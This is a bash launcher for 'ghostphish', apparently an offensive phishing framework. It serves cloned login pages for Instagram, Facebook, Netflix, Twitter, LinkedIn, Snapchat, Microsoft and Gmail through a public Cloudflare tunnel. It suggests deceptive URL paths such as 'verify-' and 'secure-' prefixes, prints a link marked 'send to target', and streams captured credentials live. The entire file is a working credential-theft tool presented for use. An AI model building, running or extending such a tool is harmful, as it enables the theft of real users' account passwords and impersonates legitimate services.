#!/usr/bin/env bash
#
# ghostphish — interactive CLI launcher
# Developed by Yaman.RedTeam
#

set -o pipefail

# ─── Colors ───────────────────────────────────────
R=$'\033[38;5;196m'    # brand red
RD=$'\033[38;5;124m'   # dark red
G=$'\033[38;5;46m'     # matrix green
GD=$'\033[38;5;28m'    # dark green
Y=$'\033[38;5;220m'    # amber
C=$'\033[38;5;51m'     # cyan accent
CD=$'\033[38;5;38m'    # muted cyan
B=$'\033[38;5;39m'     # blue
W=$'\033[38;5;255m'    # bright white
GY=$'\033[38;5;244m'   # neutral gray
D=$'\033[2m'           # dim
BLD=$'\033[1m'         # bold
N=$'\033[0m'           # reset

# OSC 8 hyperlink — clickable in modern terminals (iTerm2, WezTerm, Kitty,
# GNOME Terminal, Alacritty ≥0.11, Windows Terminal). Older terminals show plain text.
link() {
    local url="$1" text="${2:-$1}"
    printf '\033]8;;%s\033\\%s\033]8;;\033\\' "$url" "$text"
}

PORT=8000
VERSION="1.0.0"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
LOG_FILE="/tmp/ghostphish_tunnel.log"
PID_FILE="/tmp/ghostphish_tunnel.pid"
WIDTH=64

# ─── Templates: slug|Name|description ─────────────
TEMPLATES=(
    "instagram|Instagram|dark theme · close friends hero"
    "facebook|Facebook|photo collage · pill buttons"
    "netflix|Netflix|dark hero · red wordmark"
    "twitter|Twitter (X)|black bg · huge X · SSO"
    "linkedin|LinkedIn|beige · professional"
    "snapchat|Snapchat|yellow · ghost logo"
    "microsoft|Microsoft|cosmic bg · 2-step OAuth"
    "gmail|Gmail|dark · colored G · 2-step"
)

# ─── Layout helpers ───────────────────────────────
hr() {
    local ch="${1:-─}"
    local col="${2:-$GY}"
    printf "${col}"
    printf "${ch}%.0s" $(seq 1 $WIDTH)
    printf "${N}\n"
}

section() {
    printf "\n  ${R}▍${N} ${W}${BLD}%s${N}\n" "$1"
    printf "  ${D}"
    printf "─%.0s" $(seq 1 $WIDTH)
    printf "${N}\n"
}

kv() {
    # key value with dot-leader
    local key="$1" val="$2" keycol="${3:-$GY}" valcol="${4:-$W}"
    printf "    ${keycol}%-14s${N} ${valcol}%s${N}\n" "$key" "$val"
}

msg_ok()   { printf "  ${G}[+]${N} %s\n" "$*"; }
msg_err()  { printf "  ${R}[!]${N} %s\n" "$*"; }
msg_info() { printf "  ${C}[*]${N} %s\n" "$*"; }
msg_warn() { printf "  ${Y}[~]${N} %s\n" "$*"; }

banner() {
    clear
    printf "\n"
    printf "  ${R}  ▄████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗${N}   ${W}     ▄▄▄▄▄▄▄${N}\n"
    printf "  ${R} ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║  ██║██║██╔════╝██║  ██║${N}   ${W}   ▄█████████▄${N}\n"
    printf "  ${R} ██║  ███╗███████║██║   ██║███████╗   ██║   ██████╔╝███████║██║███████╗███████║${N}   ${W}   ██${RD}\033[5m ●${N}${W} ${W}█${W} ${RD}\033[5m● ${N}${W}██${N}\n"
    printf "  ${RD} ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██╔═══╝ ██╔══██║██║╚════██║██╔══██║${N}   ${W}   ██${R}   ▼   ${W}██${N}\n"
    printf "  ${RD} ██║   ██║██║  ██║╚██████╔╝███████║   ██║   ██║     ██║  ██║██║███████║██║  ██║${N}   ${W}   ▀███${R}▄▄▄${W}███▀${N}\n"
    printf "  ${RD}  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝${N}\n"
    printf "\n"
    printf "        ${GY}[${N} ${C}modern phishing framework${N} ${GY}·${N} ${Y}v${VERSION}${N} ${GY}]${N}   ${GY}Developed by${N} ${R}${BLD}Yaman.RedTeam${N}\n"
    printf "        ${R}▶${N} ${W}YouTube${N} ${D}·${N}  ${C}\e[4m%s\e[24m${N}\n" "$(link https://www.youtube.com/@YamanRedTeam https://www.youtube.com/@YamanRedTeam)"
    printf "  "
    hr "─" "$D"
    printf "  ${G}\033[5m●${N} ${GY}booted${N}   ${G}\033[5m●${N} ${GY}armed${N}   ${G}\033[5m●${N} ${GY}silent${N}   ${G}\033[5m●${N} ${GY}listening${N}\n"
    printf "\n"
}

# ─── Dependency checks ────────────────────────────
check_deps() {
    local missing=()
    # Detect runtime: docker (preferred) or python (termux / bare-metal fallback)
    RUNTIME=""
    if command -v docker >/dev/null 2>&1 && \
       (command -v docker-compose >/dev/null 2>&1 || docker compose version >/dev/null 2>&1) && \
       docker info >/dev/null 2>&1; then
        RUNTIME="docker"
    elif command -v python3 >/dev/null 2>&1; then
        RUNTIME="python"
    else
        msg_err "need either (docker + docker-compose) OR python3"
        msg_info "termux users: bash termux-setup.sh"
        exit 1
    fi
}

# ─── Container mgmt ───────────────────────────────
is_running() {
    curl -s -o /dev/null -w "%{http_code}" "http://localhost:${PORT}/health" 2>/dev/null | grep -q "200"
}

start_container() {
    if is_running; then
        msg_ok "server up ${D}→${N} ${W}localhost:${PORT}${N} ${D}(runtime: ${RUNTIME})${N}"
        return 0
    fi

    if [ "$RUNTIME" = "docker" ]; then
        msg_info "booting docker container..."
        (cd "$SCRIPT_DIR" && docker-compose up -d --build 2>&1) > /dev/null
    else
        # Python direct — uvicorn
        msg_info "booting python (uvicorn)..."

        # Wipe any incompatible pydantic v1 leftovers (from earlier Termux attempts)
        HAS_V1=$(python3 -c "import pydantic; print(int(pydantic.VERSION.startswith('1')))" 2>/dev/null || echo 0)
        if [ "$HAS_V1" = "1" ]; then
            msg_info "purging pydantic v1 (incompatible with current app.py)..."
            pip uninstall -y fastapi pydantic 2>/dev/null | tail -1 || true
        fi

        if ! python3 -c "import fastapi, uvicorn" 2>/dev/null; then
            msg_info "installing python deps (may take 15-30 min on phone — pydantic-core compiles Rust)..."
            if ! pip install -r "$SCRIPT_DIR/requirements.txt"; then
                msg_err "pip install failed — see output above"
                msg_info "On Termux, ensure Rust is installed: pkg install rust"
                exit 1
            fi
            if ! python3 -c "import fastapi, uvicorn" 2>/dev/null; then
                msg_err "install completed but fastapi still not importable"
                exit 1
            fi
        fi

        mkdir -p "$SCRIPT_DIR/data"
        pkill -f "uvicorn app:app" 2>/dev/null; sleep 1
        (cd "$SCRIPT_DIR" && GHOSTPHISH_DATA="$SCRIPT_DIR/data" \
            nohup python3 -m uvicorn app:app --host 0.0.0.0 --port "$PORT" \
            > /tmp/ghostphish_uvicorn.log 2>&1 & disown) 2>/dev/null
    fi

    sleep 4
    if is_running; then
        msg_ok "server up ${D}→${N} ${W}localhost:${PORT}${N} ${D}(runtime: ${RUNTIME})${N}"
    else
        msg_err "server failed to start"
        [ "$RUNTIME" = "docker" ] && msg_info "check: docker logs ghostphish"
        [ "$RUNTIME" = "python" ] && msg_info "check: tail /tmp/ghostphish_uvicorn.log"
        exit 1
    fi
}

# ─── Cloudflared tunnel ───────────────────────────
start_tunnel() {
    if ! command -v cloudflared >/dev/null 2>&1; then
        msg_warn "cloudflared missing · falling back to localhost"
        TUNNEL_URL="http://localhost:${PORT}"
        return 1
    fi

    msg_info "deploying cloudflare quick-tunnel..."
    pkill -f "cloudflared tunnel" 2>/dev/null
    sleep 1
    : > "$LOG_FILE"

    cloudflared tunnel --url "http://localhost:${PORT}" --no-autoupdate > "$LOG_FILE" 2>&1 &
    TUNNEL_PID=$!
    echo $TUNNEL_PID > "$PID_FILE"

    # Braille spinner
    local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    TUNNEL_URL=""
    for i in {1..30}; do
        TUNNEL_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$LOG_FILE" | head -1)
        [[ -n "$TUNNEL_URL" ]] && { printf "\r  ${G}[+]${N} tunnel handshake ok                          \n"; break; }
        printf "\r  ${Y}${frames[$((i % 10))]}${N}  waiting for cloudflare edge... (${i}s)"
        sleep 1
    done

    if [[ -z "$TUNNEL_URL" ]]; then
        printf "\r%*s\r" $WIDTH " "
        msg_err "tunnel timeout · see ${LOG_FILE}"
        TUNNEL_URL="http://localhost:${PORT}"
        return 1
    fi

    # Warm-up wait — edge takes ~5-15s to be reachable
    msg_info "warming edge..."
    for i in {1..15}; do
        code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "${TUNNEL_URL}/health")
        [ "$code" = "200" ] && break
        sleep 1
    done
    msg_ok "tunnel live ${D}→${N} ${C}${TUNNEL_URL}${N}"
    return 0
}

# ─── Template menu ────────────────────────────────
show_menu() {
    banner
    section "SELECT TEMPLATE"
    printf "\n"
    local i=1
    for t in "${TEMPLATES[@]}"; do
        IFS='|' read -r slug name desc <<< "$t"
        printf "    ${Y}%2d)${N}  ${W}%-14s${N} ${D}%s${N}\n" "$i" "$name" "$desc"
        i=$((i+1))
    done
    printf "\n"
    printf "     ${GY}0)${N}  ${D}exit${N}\n"
    printf "\n"
}

pick_template() {
    while true; do
        show_menu
        printf "  ${R}phish${N}${D}@${N}${W}ghost${N} ${GY}⟩${N} "
        read -r choice
        if [[ "$choice" == "0" ]]; then
            printf "\n  ${D}session closed.${N}\n\n"
            exit 0
        fi
        if [[ "$choice" =~ ^[1-9][0-9]*$ ]] && (( choice >= 1 && choice <= ${#TEMPLATES[@]} )); then
            IFS='|' read -r SEL_SLUG SEL_NAME SEL_DESC <<< "${TEMPLATES[$((choice-1))]}"
            return 0
        fi
        msg_err "invalid choice"
        sleep 1
    done
}

# ─── Delivery mode ────────────────────────────────
pick_mode() {
    banner
    section "DELIVERY MODE"
    printf "\n"
    kv "target" "${SEL_NAME} ${D}(${SEL_DESC})${N}" "$GY" "$C"
    printf "\n"
    printf "    ${Y}1)${N}  ${W}%-22s${N} ${D}%s${N}\n" "cloudflared tunnel"  "public HTTPS · no account"
    printf "    ${Y}2)${N}  ${W}%-22s${N} ${D}%s${N}\n" "localhost"           "same-machine testing"
    printf "     ${GY}0)${N}  ${D}back${N}\n"
    printf "\n"
    printf "  ${R}phish${N}${D}@${N}${W}mode${N}  ${GY}⟩${N} "
    read -r mode_choice
    case "$mode_choice" in
        1) DELIVERY="tunnel" ;;
        2) DELIVERY="localhost" ;;
        0) return 1 ;;
        *) msg_err "invalid"; sleep 1; return 1 ;;
    esac
    return 0
}

# ─── URL path ─────────────────────────────────────
pick_url_path() {
    banner
    section "URL MASK"
    printf "\n"
    kv "target" "${SEL_NAME}" "$GY" "$C"
    kv "mode"   "${DELIVERY}" "$GY" "$C"
    printf "\n"
    printf "    ${Y}1)${N}  ${W}%-22s${N} ${D}%s${N}\n" "default"       "/${SEL_SLUG}"
    printf "    ${Y}2)${N}  ${W}%-22s${N} ${D}%s${N}\n" "custom path"   "type your own"
    printf "    ${Y}3)${N}  ${W}%-22s${N} ${D}%s${N}\n" "preset masks"  "realistic suggestions"
    printf "     ${GY}0)${N}  ${D}back${N}\n"
    printf "\n"
    printf "  ${R}phish${N}${D}@${N}${W}mask${N}  ${GY}⟩${N} "
    read -r path_choice

    case "$path_choice" in
        1) URL_PATH="$SEL_SLUG" ;;
        2)
            printf "\n  ${D}(lowercase, digits, hyphens · e.g. ${SEL_SLUG}-login-verify)${N}\n"
            printf "  ${R}custom${N} ${GY}⟩${N} "
            read -r URL_PATH
            URL_PATH=$(echo "$URL_PATH" | tr '[:upper:]' '[:lower:]' | tr -c 'a-z0-9-' '-' | sed 's/^-*//; s/-*$//')
            [[ -z "$URL_PATH" ]] && { msg_err "empty path"; sleep 1; return 1; }
            register_alias "$URL_PATH" "$SEL_SLUG" || return 1
            ;;
        3)
            banner
            section "PRESET MASKS · ${SEL_NAME}"
            local presets=(
                "${SEL_SLUG}login"
                "${SEL_SLUG}-login"
                "login-${SEL_SLUG}"
                "verify-${SEL_SLUG}"
                "${SEL_SLUG}-verify-account"
                "secure-${SEL_SLUG}"
                "${SEL_SLUG}-account-check"
                "auth-${SEL_SLUG}"
            )
            printf "\n"
            local i=1
            for p in "${presets[@]}"; do
                printf "    ${Y}%2d)${N}  ${W}%s${N}\n" "$i" "/$p"
                i=$((i+1))
            done
            printf "\n"
            printf "  ${R}preset${N} ${GY}⟩${N} "
            read -r ps
            if [[ "$ps" =~ ^[1-9][0-9]*$ ]] && (( ps >= 1 && ps <= ${#presets[@]} )); then
                URL_PATH="${presets[$((ps-1))]}"
                register_alias "$URL_PATH" "$SEL_SLUG" || return 1
            else
                msg_err "invalid"; sleep 1; return 1
            fi
            ;;
        0) return 1 ;;
        *) msg_err "invalid"; sleep 1; return 1 ;;
    esac
    return 0
}

register_alias() {
    local path="$1" tpl="$2"
    local resp
    resp=$(curl -s -X POST "http://localhost:${PORT}/admin/aliases" \
        -H "Content-Type: application/json" \
        -d "{\"path\":\"${path}\",\"template\":\"${tpl}\"}")
    if echo "$resp" | grep -q '"success":true'; then
        msg_ok "alias set ${D}·${N} /${path} ${D}→${N} ${tpl}"
        sleep 1
        return 0
    else
        msg_err "alias failed · $resp"
        sleep 2
        return 1
    fi
}

# ─── Result screen ────────────────────────────────
show_link() {
    banner
    local full_url="${TUNNEL_URL}/${URL_PATH:-$SEL_SLUG}"

    section "PAYLOAD ARMED"
    printf "\n"
    kv "template" "${SEL_NAME} ${D}(${SEL_DESC})${N}" "$GY" "$C"
    kv "vector"   "${DELIVERY}"                        "$GY" "$C"
    kv "mask"     "/${URL_PATH:-$SEL_SLUG}"            "$GY" "$C"
    printf "\n"

    printf "    ${GY}link ${D}(send to target)${N}\n"
    printf "    ${G}${BLD}%s${N}\n\n" "$(link "$full_url" "$full_url")"

    section "OPERATIONS"
    printf "\n"
    kv "admin"    "$(link "${TUNNEL_URL}/admin/captures" "${TUNNEL_URL}/admin/captures")" "$GY" "$D"
    kv "stats"    "python3 stats.py"                   "$GY" "$D"
    kv "export"   "python3 export_captures.py csv"     "$GY" "$D"
    [[ "$DELIVERY" == "tunnel" ]] && kv "tun.log" "tail -f ${LOG_FILE}" "$GY" "$D"
    printf "\n"

    section "LIVE CAPTURES ${D}· ctrl+c to detach${N}"
    printf "\n    ${D}${G}●${N} ${D}listening...${N}\n\n"

    python3 "${SCRIPT_DIR}/watch_captures.py"
}

# ─── Main ─────────────────────────────────────────
main() {
    banner
    section "PREFLIGHT"
    printf "\n"
    check_deps
    if [ "$RUNTIME" = "docker" ]; then
        msg_ok "runtime: ${W}docker${N} + docker-compose"
    else
        msg_ok "runtime: ${W}python$(python3 --version 2>&1 | awk '{print $2}')${N} ${D}(termux / bare-metal mode)${N}"
    fi
    if command -v cloudflared >/dev/null 2>&1; then
        local cfv
        cfv=$(cloudflared --version 2>&1 | head -1 | awk '{print $3}')
        msg_ok "cloudflared ${D}${cfv}${N}"
    else
        msg_warn "cloudflared missing · localhost-only mode"
    fi
    start_container
    sleep 1

    while true; do
        pick_template
        pick_mode || continue
        URL_PATH=""
        pick_url_path || continue
        if [[ "$DELIVERY" == "tunnel" ]]; then
            banner
            section "TUNNEL DEPLOY"
            printf "\n"
            start_tunnel
        else
            TUNNEL_URL="http://localhost:${PORT}"
        fi
        show_link
    done
}

main "$@"
